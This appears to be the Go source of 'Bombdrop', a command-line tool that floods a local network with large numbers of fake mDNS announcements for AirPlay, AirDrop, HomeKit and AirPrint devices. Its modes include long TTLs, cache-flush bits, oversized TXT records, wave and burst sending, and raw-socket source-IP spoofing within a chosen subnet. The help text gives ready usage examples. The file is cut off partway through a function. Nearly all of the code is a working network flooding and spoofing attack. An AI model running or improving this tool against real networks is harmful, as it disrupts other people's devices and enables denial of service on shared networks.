package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/miekg/dns"
)

var (
	// Global variables for packet spoofing
	enableSpoofing bool
	packetSpoofer  *PacketSpoofer

	// Arrays for generating random device names
	locations = []string{
		// English
		"Living Room", "Kitchen", "Bedroom", "Office", "Basement",
		// Spanish
		"Sala de Estar", "Cocina", "Dormitorio", "Oficina", "Sótano",
		// French
		"Salon", "Cuisine", "Chambre", "Bureau", "Sous-sol",
		// German
		"Wohnzimmer", "Küche", "Schlafzimmer", "Büro", "Keller",
		// Italian
		"Soggiorno", "Cucina", "Camera da Letto", "Ufficio", "Cantina",
		// Japanese
		"リビング", "キッチン", "寝室", "オフィス", "地下室",
		// Chinese
		"客厅", "厨房", "卧室", "办公室", "地下室",
		// Korean
		"거실", "주방", "침실", "사무실", "지하실",
		// Russian
		"Гостиная", "Кухня", "Спальня", "Офис", "Подвал",
		// Arabic
		"غرفة المعيشة", "مطبخ", "غرف النوم", "مكتب", "قبو",
		// Emojis with locations
		"🏠 Home", "🎮 Game Room", "🎥 Theater", "📚 Library", "🏋️ Gym",
	}
	adjectives = []string{
		// English
		"Main", "Upper", "Lower", "Smart", "Cozy",
		// Spanish
		"Principal", "Superior", "Inferior", "Inteligente", "Acogedor",
		// French
		"Principal", "Supérieur", "Inférieur", "Intelligent", "Confortable",
		// German
		"Haupt", "Ober", "Unter", "Smart", "Gemütlich",
		// Italian
		"Principale", "Superiore", "Inferiore", "Intelligente", "Accogliente",
		// Japanese
		"メイン", "アッパー", "ロワー", "スマート", "居心地の良い",
		// Chinese
		"主要", "上层", "下层", "智能", "舒适",
		// Korean
		"메인", "상층", "하층", "스마트", "아늑한",
		// Russian
		"Главный", "Верхний", "Нижний", "Умный", "Уютный",
		// Arabic
		"رئيسي", "علوي", "سفلي", "ذكي", "مريح",
		// Emojis with adjectives
		"✨ Fancy", "🌟 Premium", "💫 Deluxe", "🎯 Pro", "⭐ Elite",
	}
	deviceTypes = []string{
		// English
		"TV", "Display", "Screen", "Hub", "Station",
		// Spanish
		"Televisor", "Pantalla", "Monitor", "Centro", "Estación",
		// French
		"Télé", "Écran", "Moniteur", "Centre", "Station",
		// German
		"Fernseher", "Bildschirm", "Monitor", "Zentrale", "Station",
		// Italian
		"TV", "Display", "Schermo", "Centro", "Stazione",
		// Japanese
		"テレビ", "ディスプレイ", "スクリーン", "ハブ", "ステーション",
		// Chinese
		"电视", "显示器", "屏幕", "中心", "站",
		// Korean
		"텔레비전", "디스플레이", "스크린", "허브", "스테이션",
		// Russian
		"Телевизор", "Дисплей", "Экран", "Хаб", "Станция",
		// Arabic
		"تلفاز", "شاشة", "عرض", "مركز", "محطة",
		// Emojis with device types
		"📺 TV", "🖥️ Display", "📱 Screen", "🎮 Console", "🎵 Audio",
	}

	// Apple device models for AirDrop
	appleModels = []string{
		"MacBookPro18,1", "MacBookPro16,2", "MacBookAir10,1",
		"iMac21,1", "iMacPro1,1", "Macmini9,1",
		"iPhone14,3", "iPhone13,4", "iPhone12,1",
		"iPad13,1", "iPad12,1", "iPad11,6",
		"Watch6,9", "AppleTV11,1",
	}

	// macOS/iOS versions
	osVersions = []string{
		"13.0", "13.1", "13.2", "13.3", "13.4",
		"12.0", "12.1", "12.2", "12.3", "12.4",
		"11.0", "11.1", "11.2", "11.3", "11.4",
		"10.15", "10.16",
	}

	// Valid broadcast types
	validBroadcastTypes = map[string]bool{
		"airplay":  true,
		"airdrop":  true,
		"homekit":  true,
		"airprint": true,
		"all":      true,
	}

	// HomeKit accessory categories
	homekitCategories = []string{
		"1",  // Other
		"2",  // Bridge
		"3",  // Fan
		"4",  // Garage Door Opener
		"5",  // Lightbulb
		"6",  // Door Lock
		"7",  // Outlet
		"8",  // Switch
		"9",  // Thermostat
		"10", // Sensor
		"11", // Security System
		"12", // Door
		"13", // Window
		"14", // Window Covering
		"15", // Programmable Switch
		"16", // Range Extender
		"17", // IP Camera
		"18", // Video Doorbell
		"19", // Air Purifier
		"20", // Heater
		"21", // Air Conditioner
		"22", // Humidifier
		"23", // Dehumidifier
	}

	// AirPrint printer models
	printerModels = []string{
		"HP LaserJet Pro",
		"Canon PIXMA",
		"Epson WorkForce",
		"Brother HL",
		"Xerox Phaser",
		"Lexmark MS",
		"Samsung Xpress",
		"Ricoh SP",
		"Kyocera ECOSYS",
		"OKI C",
	}

	// AirPrint printer capabilities
	printerCapabilities = []string{
		"duplex", "color", "copies", "collate", "staple", "bind", "punch", "cover", "sort", "booklet",
	}

	// Default TTL for all mDNS records (2 hours)
	DefaultTTL uint32 = 7200
	// Extra long TTL option (24 hours)
	ExtraLongTTL uint32 = 86400
)

// BroadcastType represents the type of broadcast to send
type BroadcastType string

const (
	BroadcastTypeAirPlay  BroadcastType = "airplay"
	BroadcastTypeAirDrop  BroadcastType = "airdrop"
	BroadcastTypeHomeKit  BroadcastType = "homekit"
	BroadcastTypeAirPrint BroadcastType = "airprint"
	BroadcastTypeAll      BroadcastType = "all"
)

// First declare the RawSender type and methods
type RawSender struct {
	fd        int
	iface     *net.Interface
	srcIP     net.IP
	dstIP     net.IP
	dstPort   int
	spoofCIDR string // CIDR block for generating random source IPs
}

// RawSender methods
func NewRawSender(ifaceName string, srcIP, dstIP net.IP, dstPort int, spoofCIDR string) (*RawSender, error) {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		return nil, fmt.Errorf("failed to create raw socket: %v", err)
	}

	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	if err != nil {
		syscall.Close(fd)
		return nil, fmt.Errorf("failed to set IP_HDRINCL: %v", err)
	}

	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		syscall.Close(fd)
		return nil, fmt.Errorf("interface not found: %v", err)
	}

	return &RawSender{
		fd:        fd,
		iface:     iface,
		srcIP:     srcIP,
		dstIP:     dstIP,
		dstPort:   dstPort,
		spoofCIDR: spoofCIDR,
	}, nil
}

func (r *RawSender) SendPacket(payload []byte) error {
	// Generate random source IP if none provided
	var srcIP net.IP
	if r.srcIP == nil {
		if r.spoofCIDR != "" {
			// Use CIDR-based IP generation for network-aware spoofing
			var err error
			srcIP, err = generateRandomIPInCIDR(r.spoofCIDR)
			if err != nil {
				return fmt.Errorf("failed to generate random IP from CIDR %s: %v", r.spoofCIDR, err)
			}
		} else {
			// Fallback to generic random private IP
			srcIP = generateRandomIP()
		}
	} else {
		srcIP = r.srcIP
	}

	// Validate that we have a valid destination IP
	if r.dstIP == nil {
		return fmt.Errorf("destination IP is nil")
	}

	// Create IP header (20 bytes)
	ipHeader := make([]byte, 20)
	ipHeader[0] = 0x45 // Version (4) + IHL (5)
	ipHeader[1] = 0    // Type of Service
	length := uint16(20 + 8 + len(payload))
	ipHeader[2] = byte(length >> 8)      // Total Length (high byte)
	ipHeader[3] = byte(length)           // Total Length (low byte)
	ipHeader[4] = 0                      // Identification (high byte)
	ipHeader[5] = 0                      // Identification (low byte)
	ipHeader[6] = 0                      // Flags + Fragment Offset (high 3 bits)
	ipHeader[7] = 0                      // Fragment Offset (low 8 bits)
	ipHeader[8] = 64                     // TTL
	ipHeader[9] = syscall.IPPROTO_UDP    // Protocol
	ipHeader[10] = 0                     // Header Checksum (high byte) - will be calculated
	ipHeader[11] = 0                     // Header Checksum (low byte) - will be calculated
	copy(ipHeader[12:16], srcIP.To4())   // Source IP
	copy(ipHeader[16:20], r.dstIP.To4()) // Destination IP

	// Calculate IP header checksum
	ipChecksum := calculateIPChecksum(ipHeader)
	ipHeader[10] = byte(ipChecksum >> 8)
	ipHeader[11] = byte(ipChecksum)

	// Create UDP header (8 bytes)
	udpHeader := make([]byte, 8)
	srcPort := uint16(rand.Intn(16383) + 49152) // Random high port
	udpHeader[0] = byte(srcPort >> 8)           // Source Port (high byte)
	udpHeader[1] = byte(srcPort)                // Source Port (low byte)
	udpHeader[2] = byte(r.dstPort >> 8)         // Destination Port (high byte)
	udpHeader[3] = byte(r.dstPort)              // Destination Port (low byte)
	udpLen := uint16(8 + len(payload))
	udpHeader[4] = byte(udpLen >> 8) // UDP Length (high byte)
	udpHeader[5] = byte(udpLen)      // UDP Length (low byte)
	udpHeader[6] = 0                 // UDP Checksum (high byte) - will be calculated
	udpHeader[7] = 0                 // UDP Checksum (low byte) - will be calculated

	// Calculate UDP checksum
	udpChecksum := calculateUDPChecksum(srcIP.To4(), r.dstIP.To4(), udpHeader, payload)
	udpHeader[6] = byte(udpChecksum >> 8)
	udpHeader[7] = byte(udpChecksum)

	// Assemble the complete packet
	packet := append(ipHeader, udpHeader...)
	packet = append(packet, payload...)

	// Prepare destination address for sendto
	addr := syscall.SockaddrInet4{
		Port: r.dstPort,
	}
	copy(addr.Addr[:], r.dstIP.To4())

	// Send the packet
	err := syscall.Sendto(r.fd, packet, 0, &addr)
	if err != nil {
		return fmt.Errorf("failed to send packet: %v", err)
	}

	return nil
}

func (r *RawSender) Close() error {
	return syscall.Close(r.fd)
}

// calculateIPChecksum calculates the IP header checksum
func calculateIPChecksum(header []byte) uint16 {
	var sum uint32

	// Sum all 16-bit words in the header
	for i := 0; i < len(header); i += 2 {
		if i+1 < len(header) {
			sum += uint32(header[i])<<8 + uint32(header[i+1])
		} else {
			sum += uint32(header[i]) << 8
		}
	}

	// Add carry bits
	for (sum >> 16) > 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}

	// One's complement
	return uint16(^sum)
}

// calculateUDPChecksum calculates the UDP checksum including the pseudo-header
func calculateUDPChecksum(srcIP, dstIP []byte, udpHeader, payload []byte) uint16 {
	var sum uint32

	// Pseudo-header: srcIP (4) + dstIP (4) + 0 (1) + protocol (1) + udpLen (2)
	// Add source IP
	sum += uint32(srcIP[0])<<8 + uint32(srcIP[1])
	sum += uint32(srcIP[2])<<8 + uint32(srcIP[3])

	// Add destination IP
	sum += uint32(dstIP[0])<<8 + uint32(dstIP[1])
	sum += uint32(dstIP[2])<<8 + uint32(dstIP[3])

	// Add protocol (UDP = 17)
	sum += uint32(17)

	// Add UDP length
	udpLen := uint32(udpHeader[4])<<8 + uint32(udpHeader[5])
	sum += udpLen

	// Add UDP header (excluding checksum field)
	for i := 0; i < len(udpHeader); i += 2 {
		if i == 6 { // Skip checksum field
			continue
		}
		if i+1 < len(udpHeader) {
			sum += uint32(udpHeader[i])<<8 + uint32(udpHeader[i+1])
		}
	}

	// Add payload
	for i := 0; i < len(payload); i += 2 {
		if i+1 < len(payload) {
			sum += uint32(payload[i])<<8 + uint32(payload[i+1])
		} else {
			sum += uint32(payload[i]) << 8
		}
	}

	// Add carry bits
	for (sum >> 16) > 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}

	// One's complement
	checksum := uint16(^sum)

	// UDP checksum of 0 means no checksum, but we want to send a proper checksum
	// In the very rare case it calculates to 0, we use 0xFFFF instead
	if checksum == 0 {
		checksum = 0xFFFF
	}

	return checksum
}

// Declare broadcastAnnouncements as a separate function
func broadcastAnnouncements(conn *net.UDPConn, rawSender *RawSender, announcements []*dns.Msg, nameMode string, roundNum int, debug bool) {
	startTime := time.Now()
	announcementCount := 0
	destAddr := &net.UDPAddr{IP: net.ParseIP("224.0.0.251"), Port: 5353}

	for _, announcement := range announcements {
		announcementBytes, err := announcement.Pack()
		if err != nil {
			if debug {
				log.Printf("Error packing announcement: %v", err)
			}
			continue
		}

		if rawSender != nil {
			// Use raw socket for spoofed packets
			err = rawSender.SendPacket(announcementBytes)
			if err != nil && debug {
				log.Printf("Error sending raw packet: %v", err)
			}
		} else if conn != nil {
			// Use UDP socket for normal packets
			_, err = conn.WriteToUDP(announcementBytes, destAddr)
			if err != nil && debug {
				log.Printf("Error sending UDP packet: %v", err)
			}
		}

		announcementCount++
	}

	if debug {
		log.Printf("Broadcast completed: Mode: %s, Round: %d, Sent %d announcements in %v",
			nameMode, roundNum, announcementCount, time.Since(startTime))
	}
}

func main() {
	numDevices := flag.Int("n", 1000, "Number of devices to advertise")
	debug := flag.Bool("debug", false, "Enable debug logging")
	help := flag.Bool("h", false, "Show help")
	interfaceName := flag.String("i", "", "Network interface to use (default: system chosen)")
	targetIP := flag.String("b", "224.0.0.251", "Target IP address to send to")
	count := flag.Int("c", 0, "Number of announcement rounds (0 = infinite)")
	broadcastTypeStr := flag.String("type", "all", "Broadcast type: airplay, airdrop, homekit, airprint, or all")
	preGenerate := flag.Bool("pregenerate", false, "Pre-generate devices once and reuse them")
	cacheMode := flag.String("cache", "standard", "Cache pressure mode: standard, aggressive, extreme")
	spoofNetwork := flag.String("spoof", "", "Enable IP address spoofing with network CIDR (e.g., -spoof 192.168.1.0/24)")
	ttlValue := flag.Uint("ttl", uint(DefaultTTL), "TTL value in seconds (default: 7200)")
	ttlMode := flag.String("ttl-mode", "normal", "TTL mode: normal, long, extreme")
	nameMode := flag.String("name-mode", "mixed", "Device naming mode: static, dynamic, compare")
	sourceIP := flag.String("s", "", "Source IP address (default: system chosen)")
	flag.Parse()

	// Show help if requested or no arguments provided
	if *help || len(os.Args) == 1 {
		fmt.Println(`
Bombdrop - mDNS Cache Pressure Tool

Usage:
  sudo go run bombdrop.go -n 5000 [-debug] [-i eth0] [-b 224.0.0.251] [-s 192.168.1.100] [-c 10] [-type all]

Options:
  -n <num>         Number of devices to advertise (default: 1000)
  -debug           Enable debug logging
  -i <iface>       Network interface to use (default: system chosen)
  -b <ip>          Target IP address (default: 224.0.0.251)
  -s <ip>          Source IP address (default: system chosen)
  -c <count>       Number of announcement rounds (0 = infinite)
  -type <t>        Broadcast type: airplay, airdrop, homekit, airprint, or all (default: all)
  -spoof <network> Enable IP address spoofing with network CIDR (e.g., -spoof 192.168.1.0/24)
  -ttl <seconds>   TTL value in seconds (default: 7200)
  -ttl-mode <mode> TTL mode: normal, long, extreme (default: normal)
  -name-mode <m>   Device naming mode: static, dynamic, compare (default: mixed)
  -pregenerate     Pre-generate

Examples:
  # Basic usage with 5000 devices
  sudo go run bombdrop.go -n 5000

  # Specify network interface and only broadcast AirPlay
  sudo go run bombdrop.go -i eth0 -n 1000 -type airplay

  # Use broadcast instead of multicast and only broadcast HomeKit
  sudo go run bombdrop.go -b 192.168.1.255 -n 1000 -type homekit

  # Send 10 rounds of AirPrint announcements and exit
  sudo go run bombdrop.go -n 100 -c 10 -type airprint

  # Use IP spoofing with network-aware random source IPs
  sudo go run bombdrop.go -n 1000 -spoof 192.168.1.0/24 -type all

Notes:
  - For multicast: 224.0.0.251 is the standard mDNS address
  - For broadcast: use your subnet's broadcast (typically x.x.x.255)
  - For /31 networks: there is no broadcast address, use multicast or direct IP
  - Root/admin privileges are usually required for multicast
  - IP spoofing (-spoof) requires root privileges and a network CIDR block
  - Spoofed IPs will be generated randomly within the specified network segment
`)
		return
	}

	// Validate and parse broadcast type
	*broadcastTypeStr = strings.ToLower(*broadcastTypeStr)
	if !validBroadcastTypes[*broadcastTypeStr] {
		log.Fatalf("Invalid broadcast type: %s. Must be one of: airplay, airdrop, homekit, airprint, all", *broadcastTypeStr)
	}

	var broadcastTypes []BroadcastType
	if *broadcastTypeStr == "all" {
		broadcastTypes = []BroadcastType{BroadcastTypeAll}
	} else {
		broadcastTypes = []BroadcastType{BroadcastType(*broadcastTypeStr)}
	}

	// Parse the target IP
	targetIPAddr := net.ParseIP(*targetIP)
	if targetIPAddr == nil {
		log.Fatalf("Invalid target IP address: %s", *targetIP)
	}

	if *debug {
		log.Printf("Sending to IP: %s", targetIPAddr.String())
		log.Printf("Broadcast type: %s", *broadcastTypeStr)
	}

	// Parse the source IP
	var srcIP net.IP
	if *sourceIP != "" {
		srcIP = net.ParseIP(*sourceIP)
		if srcIP == nil {
			log.Fatalf("Invalid source IP address: %s", *sourceIP)
		}
		if *debug {
			log.Printf("Using source IP: %s", srcIP.String())
		}
	}

	var conn *net.UDPConn
	var rawSender *RawSender
	var err error

	// Initialize raw sender if spoofing is enabled
	if *spoofNetwork != "" {
		if *debug {
			log.Printf("Initializing raw socket sender with network spoofing: %s", *spoofNetwork)
		}
		rawSender, err = NewRawSender(*interfaceName, srcIP, targetIPAddr, 5353, *spoofNetwork)
		if err != nil {
			log.Fatalf("Failed to create raw sender: %v", err)
		}
		defer rawSender.Close()
	} else {
		// Only create UDP socket if not spoofing
		conn, err = net.DialUDP("udp4", nil, &net.UDPAddr{
			IP:   targetIPAddr,
			Port: 5353,
		})
		if err != nil {
			log.Fatal(err)
		}
		defer conn.Close()

		// Set multicast interface if specified
		if *interfaceName != "" {
			ifi, err := net.InterfaceByName(*interfaceName)
			if err != nil {
				log.Fatalf("Error finding interface %s: %v", *interfaceName, err)
			}
			if targetIPAddr.IsMulticast() {
				if err := setMulticastInterface(conn, ifi); err != nil && *debug {
					log.Printf("Warning: couldn't set multicast interface: %v", err)
				}
			}
		}
	}

	// Initialize the announcements variable
	var currentAnnouncements []*dns.Msg
	var staticAnnouncements []*dns.Msg

	// Process the ttl mode flag
	var actualTTL uint32
	switch *ttlMode {
	case "long":
		actualTTL = ExtraLongTTL
	case "extreme":
		actualTTL = 604800 // 1 week
	default:
		actualTTL = uint32(*ttlValue)
	}

	if *debug {
		log.Printf("Using TTL of %d seconds for mDNS records", actualTTL)
	}

	// Pre-generate static devices if needed
	if *nameMode == "static" || *nameMode == "compare" || *preGenerate {
		if *debug {
			log.Printf("Pre-generating static device set with %d devices", *numDevices)
		}
		staticAnnouncements = generateDevices(*numDevices, broadcastTypes, actualTTL, *debug)
	}

	// Track how many rounds we've sent
	roundsSent := 0

	// Use proper variable assignment
	var deviceMultiplier int
	switch *cacheMode {
	case "aggressive":
		deviceMultiplier = 10 // Generate 10x more records per device
	case "extreme":
		deviceMultiplier = 100 // Generate 100x more records per device
	default:
		deviceMultiplier = 1
	}

	// Main broadcast loop
	for {
		// Choose which announcements to use based on mode
		if *nameMode == "dynamic" || (*nameMode == "compare" && roundsSent%2 == 1) {
			if *debug {
				log.Printf("Using dynamic device names for this round")
			}
			currentAnnouncements = generateDevices(*numDevices, broadcastTypes, actualTTL, *debug)
		} else {
			if *debug && *nameMode == "compare" {
				log.Printf("Using static device names for this round")
			}
			currentAnnouncements = staticAnnouncements
		}

		// Broadcast all announcements
		startTime := time.Now()
		announcementCount := 0

		// When calling broadcastAnnouncements, pass the rawSender
		broadcastAnnouncements(conn, rawSender, currentAnnouncements, *nameMode, roundsSent, *debug)

		// Calculate how long the broadcast took
		broadcastDuration := time.Since(startTime)

		if *debug {
			log.Printf("Broadcast round %d: sent %d announcements in %v",
				roundsSent+1, announcementCount, broadcastDuration)
		}

		roundsSent++

		// Check if we should exit
		if *count > 0 && roundsSent >= *count {
			if *debug {
				log.Printf("Completed %d rounds, exiting", roundsSent)
			}
			return
		}

		// Wait a bit before the next round
		// If the broadcast took less than 500ms, wait the remainder
		// Otherwise, proceed immediately to the next round
		waitTime := 500*time.Millisecond - broadcastDuration
		if waitTime > 0 {
			time.Sleep(waitTime)
		}

		// Send in waves to trigger batch processing
		switch *cacheMode {
		case "wave":
			currentAnnouncements = sendInWavePattern(conn, currentAnnouncements, *debug)
		case "random":
			// Send in random bursts to be unpredictable
			currentAnnouncements = sendInRandomBursts(conn, currentAnnouncements, *debug)
		default:
			// Standard steady broadcasts
			broadcastAnnouncements(conn, nil, currentAnnouncements, *nameMode, roundsSent, *debug)
		}

		// If cacheFlush is enabled, create special cache-flush records
		if deviceMultiplier > 1 && *debug {
			log.Printf("Using cache pressure multiplier: %d", deviceMultiplier)

			// Optionally, actually use the multiplier in device generation
			if *preGenerate {
				currentAnnouncements = generateDevicesForCachePressure(*numDevices, broadcastTypes, deviceMultiplier, actualTTL, *debug)
			}
		}
	}
}

// Helper function to generate devices for the selected broadcast types
func generateDevicesForTypes(count int, broadcastTypes []BroadcastType, ttl uint32, debug bool) []*dns.Msg {
	var announcements []*dns.Msg

	// Create a map for faster lookup
	typeMap := make(map[BroadcastType]bool)
	for _, t := range broadcastTypes {
		typeMap[t] = true
	}

	// Check if we should include all types
	includeAll := typeMap[BroadcastTypeAll]

	for i := 0; i < count; i++ {
		name := generateDeviceName()
		dnsName, displayName := sanitizeDeviceName(name)
		deviceID := generateDeviceID()

		broadcastInfo := ""

		// Add AirPlay announcements if requested
		if includeAll || typeMap[BroadcastTypeAirPlay] {
			airplayAnnouncements := createAirPlayAnnouncements(dnsName, deviceID, ttl)
			announcements = append(announcements, airplayAnnouncements...)
			broadcastInfo += "AirPlay "
		}

		// Add AirDrop announcements if requested
		if includeAll || typeMap[BroadcastTypeAirDrop] {
			airdropAnnouncements := createAirDropAnnouncements(dnsName, deviceID, ttl)
			announcements = append(announcements, airdropAnnouncements...)
			broadcastInfo += "AirDrop "
		}

		// Add HomeKit announcements if requested
		if includeAll || typeMap[BroadcastTypeHomeKit] {
			homekitAnnouncements := createHomeKitAnnouncements(dnsName, deviceID, ttl)
			announcements = append(announcements, homekitAnnouncements...)
			broadcastInfo += "HomeKit "
		}

		// Add AirPrint announcements if requested
		if includeAll || typeMap[BroadcastTypeAirPrint] {
			airprintAnnouncements := createAirPrintAnnouncements(dnsName, deviceID, ttl)
			announcements = append(announcements, airprintAnnouncements...)
			broadcastInfo += "AirPrint "
		}

		if debug && (i == 0 || i == count-1 || i%100 == 0) {
			log.Printf("Generated device %d/%d: %s (%s)", i+1, count, displayName, strings.TrimSpace(broadcastInfo))
		}
	}

	return announcements
}

// Modified generateDevices function to enhance cache pressure
func generateDevicesForCachePressure(count int, broadcastTypes []BroadcastType, multiplier int, ttl uint32, debug bool) []*dns.Msg {
	var announcements []*dns.Msg

	for i := 0; i < count; i++ {
		// Standard device generation
		name := generateDeviceName()
		dnsName, displayName := sanitizeDeviceName(name)
		deviceID := generateDeviceID()

		// Generate standard announcements
		deviceAnnouncements := generateDeviceAnnouncements(dnsName, deviceID, broadcastTypes, ttl)
		announcements = append(announcements, deviceAnnouncements...)

		// Add extra records to increase cache pressure
		if multiplier > 1 {
			for j := 0; j < multiplier-1; j++ {
				// Generate variant records with slight differences
				extraName := fmt.Sprintf("%s-extra%d", dnsName, j+1)
				// Add TXT records with increasing sizes to consume more memory
				extraTXT := createExtraSizedTXTRecord(extraName, j*1024, ttl) // Increasing record sizes
				announcements = append(announcements, extraTXT)
			}
		}

		if debug && (i == 0 || i == count-1 || i%1000 == 0) {
			log.Printf("Generated device %d/%d: %s with %d extra records",
				i+1, count, displayName, multiplier-1)
		}
	}

	return announcements
}

// Generate TXT records with specified size to consume more cache memory
func createExtraSizedTXTRecord(name string, size int, ttl uint32) *dns.Msg {
	msg := new(dns.Msg)
	msg.Response = true
	msg.Authoritative = true

	// Create large TXT record
	txt := &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   fmt.Sprintf("%s._large-txt._tcp.local.", name),
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET | 0x8000,
			Ttl:    ttl,
		},
		Txt: []string{
			generateRandomString(size),
		},
	}

	msg.Answer = []dns.RR{txt}
	return msg
}

// Generate random string of specified size
func generateRandomString(size int) string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, size)
	for i := range result {
		result[i] = chars[rand.Intn(len(chars))]
	}
	return string(result)
}

// Send announcements in wave pattern
func sendInWavePattern(conn *net.UDPConn, announcements []*dns.Msg, debug bool) []*dns.Msg {
	announceCount := len(announcements)
	waveSizes := []int{1000, 5000, 10000, 15000, 20000, 15000, 10000, 5000, 1000}

	startIndex := 0
	for _, waveSize := range waveSizes {
		if startIndex >= announceCount {
			break
		}

		endIndex := startIndex + waveSize
		if endIndex > announceCount {
			endIndex = announceCount
		}

		if debug {
			log.Printf("Sending wave of %d announcements", endIndex-startIndex)
		}

		// Send this wave rapidly
		for i := startIndex; i < endIndex; i++ {
			announcementBytes, _ := announcements[i].Pack()
			conn.Write(announcementBytes)
		}

		// Short pause between waves
		time.Sleep(100 * time.Millisecond)
		startIndex = endIndex
	}

	return announcements
}

// Send announcements in random bursts
func sendInRandomBursts(conn *net.UDPConn, announcements []*dns.Msg, debug bool) []*dns.Msg {
	announceCount := len(announcements)
	burstSizes := []int{100, 500, 1000, 5000, 10000, 50000}

	// Fix: Replace the unused variable 'i' with a more descriptive name that indicates its purpose
	for burstIndex := 0; burstIndex < 5; burstIndex++ { // Do 5 bursts and return
		burstSize := burstSizes[rand.Intn(len(burstSizes))]
		if burstSize > announceCount {
			burstSize = announceCount
		}

		if debug {
			log.Printf("Sending burst of %d announcements", burstSize)
		}

		// Use range operator with _
		for k := 0; k < burstSize; k++ {
			announcementBytes, _ := announcements[rand.Intn(announceCount)].Pack()
			conn.Write(announcementBytes)
		}

		// Wait between bursts
		waitTime := time.Duration(rand.Intn(500)) * time.Millisecond
		time.Sleep(waitTime)
	}

	return announcements
}

// Generate records that specifically target cache flush behavior
func generateCacheFlushRecords(count int) []*dns.Msg {
	var records []*dns.Msg

	for i := 0; i < count; i++ {
		// Create record with cache-flush bit set
		msg := new(dns.Msg)
		msg.Response = true
		msg.Authoritative = true

		name := fmt.Sprintf("flush-%d.local.", i)

		// A record with cache-flush bit set
		aRecord := &dns.A{
			Hdr: dns.RR_Header{
				Name:   name,
				Rrtype: dns.TypeA,
				Class:  dns.ClassINET | 0x8000, // Cache flush bit
				Ttl:    1,                      // Very short TTL
			},
			A: generateRandomIP(),
		}

		msg.Answer = []dns.RR{aRecord}
		records = append(records, msg)

		// Also create matching PTR with same name but without flush
		ptrRecord := createQuery(name, dns.TypePTR)
		records = append(records, ptrRecord)
	}

	return records
}

func generateDeviceName() string {
	// Create random device names using the arrays
	adj := adjectives[rand.Intn(len(adjectives))]
	loc := locations[rand.Intn(len(locations))]
	dev := deviceTypes[rand.Intn(len(deviceTypes))]

	// Sometimes add a random number suffix for extra variety
	if rand.Intn(2) == 1 {
		return fmt.Sprintf("%s %s %s %d", adj, loc, dev, rand.Intn(999))
	}
	return fmt.Sprintf("%s %s %s", adj, loc, dev)
}

func generateDeviceID() string {
	bytes := make([]byte, 6)
	rand.Read(bytes)
	return fmt.Sprintf("%02X:%02X:%02X:%02X:%02X:%02X",
		bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5])
}

// generateRandomIPInCIDR generates a random IP address within the given CIDR block
func generateRandomIPInCIDR(cidr string) (net.IP, error) {
	_, network, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, fmt.Errorf("invalid CIDR: %v", err)
	}

	// Get network address and mask
	networkIP := network.IP.To4()
	if networkIP == nil {
		return nil, fmt.Errorf("only IPv4 CIDR blocks are supported")
	}

	mask := network.Mask
	if len(mask) != 4 {
		return nil, fmt.Errorf("invalid IPv4 mask")
	}

	// Calculate the number of host bits
	ones, bits := mask.Size()
	if bits != 32 {
		return nil, fmt.Errorf("invalid mask size")
	}
	hostBits := bits - ones

	// Generate random host part (avoiding network and broadcast addresses)
	maxHosts := (1 << hostBits) - 2 // -2 for network and broadcast
	if maxHosts <= 0 {
		return nil, fmt.Errorf("network too small for host addresses")
	}

	randomHost := rand.Intn(maxHosts) + 1 // +1 to skip network address

	// Create the IP by applying the random host bits to the network
	ip := make(net.IP, 4)
	copy(ip, networkIP)

	// Apply the random host part
	hostIP := uint32(randomHost)
	for i := 3; i >= 0; i-- {
		if mask[i] != 0xFF {
			// This byte has host bits
			hostByte := byte(hostIP & 0xFF)
			ip[i] = (ip[i] & mask[i]) | (hostByte & ^mask[i])
			hostIP >>= 8
		}
	}

	return ip, nil
}

// generateRandomIP generates a random private IP (fallback for compatibility)
func generateRandomIP() net.IP {
	ip := make(net.IP, 4)
	// Generate a random private IP address
	ip[0] = 192
	ip[1] = 168
	ip[2] = byte(rand.Intn(255) + 1)
	ip[3] = byte(rand.Intn(254) + 1)
	return ip
}

func sanitizeDeviceName(name string) (string, string) {
	// Keep original name for display
	displayName := name

	// Simple DNS-safe conversion:
	// 1. Replace spaces with hyphens
	// 2. Remove any characters that aren't alphanumeric, hyphens, or dots
	// 3. Limit length to 63 characters (DNS label limit)
	dnsName := strings.Map(func(r rune) rune {
		switch {
		case r >= 'a' && r <= 'z':
			return r
		case r >= 'A' && r <= 'Z':
			return r
		case r >= '0' && r <= '9':
			return r
		case r == ' ':
			return '-'
		case r == '.':
			return r
		case r == '-':
			return r
		default:
			return '-'
		}
	}, name)

	// Ensure no double hyphens
	for strings.Contains(dnsName, "--") {
		dnsName = strings.ReplaceAll(dnsName, "--", "-")
	}

	// Trim hyphens from start and end
	dnsName = strings.Trim(dnsName, "-")

	// Ensure we have a valid name
	if len(dnsName) == 0 {
		dnsName = fmt.Sprintf("device-%d", rand.Intn(10000))
	}

	// Truncate if too long
	if len(dnsName) > 63 {
		dnsName = dnsName[:63]
		// Ensure we don't end with a hyphen
		dnsName = strings.TrimRight(dnsName, "-")
	}

	return dnsName, displayName
}

func createAirPlayAnnouncements(name string, deviceID string, ttl uint32) []*dns.Msg {
	// Create base AirPlay announcement
	airplayMsg := new(dns.Msg)
	airplayMsg.Response = true
	airplayMsg.Authoritative = true
	airplayMsg.Id = 0

	// AirPlay PTR
	airplayPtr := &dns.PTR{
		Hdr: dns.RR_Header{
			Name:   "_airplay._tcp.local.",
			Rrtype: dns.TypePTR,
			Class:  dns.ClassINET,
			Ttl:    ttl,
		},
		Ptr: fmt.Sprintf("%s._airplay._tcp.local.", name),
	}

	// SRV with cache-flush
	srvAirPlay := &dns.SRV{
		Hdr: dns.RR_Header{
			Name:   fmt.Sprintf("%s._airplay._tcp.local.", name),
